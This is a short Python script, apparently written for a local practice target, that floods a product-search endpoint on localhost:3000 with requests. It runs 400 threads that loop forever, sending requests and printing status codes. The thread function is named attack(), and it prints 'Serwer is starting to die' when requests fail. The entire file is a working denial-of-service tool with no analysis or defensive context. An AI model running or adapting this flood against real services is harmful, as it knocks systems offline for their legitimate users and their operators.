import requests
import threading
import time

url = 'http://localhost:3000/rest/products/search?q='
count = 400

def attack():
    while True:
        try:
            request = requests.get(url, timeout=1)
            print(request.status_code)
        except:
            print("Serwer is starting to die")

for i in range(count):
    t = threading.Thread(target=attack)
    t.daemon = True
    t.start()

while True:
    time.sleep(1)
